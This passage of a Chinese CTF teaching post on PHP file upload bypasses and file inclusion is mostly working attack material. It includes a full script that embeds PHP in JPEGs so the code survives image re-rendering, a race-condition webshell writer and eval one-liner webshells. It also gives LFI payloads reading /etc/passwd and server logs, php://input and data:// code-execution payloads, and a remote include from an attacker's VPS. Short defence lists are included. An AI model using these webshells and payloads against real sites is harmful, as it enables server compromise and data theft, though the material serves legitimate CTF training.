class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>羽师傅的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>1、先上传JPG图片，然后下载至本地保存为1.jpg</p>
<p>2、插入php代码，用脚本处理1.jpg</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p>3、上传图片马；将生成的 payload_1.jpg上传。</p>
<p>4、验证；将上传的图片再次下载到本地。</p>
<p>可以看到，php代码没有被去除，证明我们成功上传了含有php代码的jpg图片。</p>
<p>注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片。</p>
<h3 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h3><blockquote>
<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
</blockquote>
<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
<p>在文件幻数后面加上自己的WebShell代码就行（常见的是<code>GIF89a</code>）</p>
<p>图像文件相关信息检测常用的是<code>getimagesize()</code>函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png" alt="image-20210208225003833"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p><code>如upload-labs第十七关</code></p>
<p>一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。</p>
<blockquote>
<p>服务器端在处理不同用户的请求时是并发进行的</p>
<p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))&#123;</span><br><span class="line">		copy(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">      sleep(<span class="number">2</span>);<span class="comment">//检查操作</span></span><br><span class="line">		unlink(<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>它先把文件保存在本地，再检查，然后删除</p>
<p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件</p>
<p>该文件就会被执行从而生成一个恶意shell</p>
<p><strong>竞争删除前生成shell流程：</strong></p>
<blockquote>
<p>上传文件→访问执行文件，生成shell文件→删除不安全文件     (多线程访问)</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>在php执行的过程中，除了主 <code>php.ini</code> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code>.user.ini</code> 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 <code>.user.ini</code> 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> </p>
<ul>
<li>需要当前上传的目录下有php文件</li>
</ul>
<p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">.user.ini导致文件上传绕过</a></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote>
<ul>
<li>文件扩展名服务端白名单效验</li>
<li>文件内容服务端效验  &lt;? php </li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
</ul>
</blockquote>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
<p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。</p>
<p>但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞</p>
</blockquote>
<h3 id="demo实验"><a href="#demo实验" class="headerlink" title="demo实验"></a>demo实验</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>()		<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">    <span class="comment">//warning</span></span><br><span class="line"><span class="keyword">include_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()		<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br></pre></td></tr></table></figure>
<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><blockquote>
<p>用户可以控制包含的文件名，从而造成信息泄露和getshell</p>
</blockquote>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.读敏感文件</span><br><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">2.利用封装协议读源码</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php	#这样能看到php文件的源码</span><br><span class="line"></span><br><span class="line">4.包含日志文件getshell</span><br><span class="line">路径</span><br><span class="line">apache:&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">3.包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</span><br><span class="line"></span><br><span class="line">5.session文件包含getshell</span><br></pre></td></tr></table></figure>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>CTFSHOW-web80-81</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
<h4 id="照片木马的制作"><a href="#照片木马的制作" class="headerlink" title="照片木马的制作"></a>照片木马的制作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行命令copy 1.png&#x2F;b + 1.php&#x2F;a 2.jpg </span><br><span class="line">前两个文件合并成一个文件，文件属性为2.jpg</span><br></pre></td></tr></table></figure>
<h3 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h3><h4 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</span><br><span class="line">include()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下</span><br></pre></td></tr></table></figure>
<h4 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off&#x2F;on</span><br><span class="line">allow_url_include : 部分需要on (下面列出)</span><br><span class="line">php:&#x2F;&#x2F;input  #用的比较多 输入流</span><br></pre></td></tr></table></figure>
<h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a><strong>作用：</strong></h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 php://filter 和 php://input</span></span><br><span class="line">php:<span class="comment">//filter用于读取源码，php://input用于执行php代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"><span class="comment">#ctfshow web78</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.php://input + [POST DATA]执行php代码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分] &lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line"></span><br><span class="line">allow_url_include :on</span><br><span class="line">#ctfshow web79</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt;   &lt;?php system(&#39;cat flag.php&#39;);</span><br></pre></td></tr></table></figure>
<p><strong>作用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">自PHP&gt;=<span class="number">5.2</span>.<span class="number">0</span>起，可以使用 data:<span class="comment">// 数据流封装器，以传递相应格式的数据。</span></span><br><span class="line">通常可以用来执行PHP代码</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.data://text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.data://text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
<h3 id="远程文件包含-RFL"><a href="#远程文件包含-RFL" class="headerlink" title="远程文件包含(RFL)"></a>远程文件包含(RFL)</h3><blockquote>
<p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p>
<p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
</blockquote>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>条件：</strong><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
<p><strong>1、远程包含Webshell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>
<p><strong>shell.txt内容为：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%2562ase64-encode&#x2F;resource</span><br></pre></td></tr></table></figure>
<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h5><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h5><p><a href="https://xz.aliyun.com/t/5535#toc-2">浅析php文件包含及其getshell的姿势</a></p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on  php 4 5</code> </li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>文件上传经常和文件包含一起考察。  如：ctfshow web164</p>
<ul>
<li><p>判断是黑名单还是白名单</p>
</li>
<li><p>白名单解析漏洞绕过，配合文件包含 照片二次渲染等等</p>
</li>
<li><p>黑名单扩展名绕过或.htaccess,.user.ini等绕过总结</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include() url</span><br><span class="line">file_get_concent()</span><br></pre></td></tr></table></figure>
</li>
</ul>
